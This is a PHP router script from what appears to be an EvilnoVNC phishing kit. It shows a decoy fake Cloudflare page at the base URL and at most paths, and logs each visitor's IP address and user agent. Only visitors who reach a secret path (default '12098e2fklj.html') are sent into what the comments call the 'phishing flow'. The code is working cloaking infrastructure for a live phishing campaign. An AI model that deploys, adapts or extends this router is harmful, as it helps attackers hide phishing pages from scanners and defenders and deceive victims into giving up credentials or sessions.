<?php
/**
 * EvilnoVNC router: base URL -> fake Cloudflare page; secret path -> phishing flow.
 * Secret path is read from php.ini SECRET_PATH (default: 12098e2fklj.html).
 */
$requestUri = $_SERVER['REQUEST_URI'] ?? '/';
$path = parse_url($requestUri, PHP_URL_PATH) ?? '/';
$path = '/' . trim($path, '/');
if ($path === '//') {
    $path = '/';
}

$logFile = '/home/user/Downloads/access.log';
$log = function ($type) use ($path, $logFile) {
    $ts = date('Y-m-d H:i:s');
    $ip = $_SERVER['REMOTE_ADDR'] ?? '?';
    $ua = trim($_SERVER['HTTP_USER_AGENT'] ?? '-');
    if (strlen($ua) > 80) {
        $ua = substr($ua, 0, 77) . '...';
    }
    @file_put_contents($logFile, "$ts | $type | $ip | $path | $ua\n", FILE_APPEND | LOCK_EX);
};

// Only the exact secret path gets the phishing flow; everything else (including /) gets the fake page.
$config = @parse_ini_file(__DIR__ . '/php.ini', false);
$secretPath = isset($config['SECRET_PATH']) ? trim($config['SECRET_PATH']) : '12098e2fklj.html';
$secretPath = ltrim($secretPath, '/');
$secretPathFull = ($secretPath !== '') ? '/' . $secretPath : null;

// Phishing flow only for the exact secret path (never for / or empty path)
if ($secretPathFull !== null && $path === $secretPathFull) {
    $log('PHISHING_FLOW');
    require __DIR__ . '/index.php';
    return true;
}

// Base URL and any other path: serve fake Cloudflare page
$log('FAKE_PAGE');
$fakePath = __DIR__ . '/CloudflareFake.html';
if (is_readable($fakePath)) {
    header('Content-Type: text/html; charset=utf-8');
    readfile($fakePath);
} else {
    header('HTTP/1.0 404 Not Found');
    echo 'Not Found';
}
// Return true so the server uses our output; return false would make it serve the requested file (e.g. index.php for /)
return true;
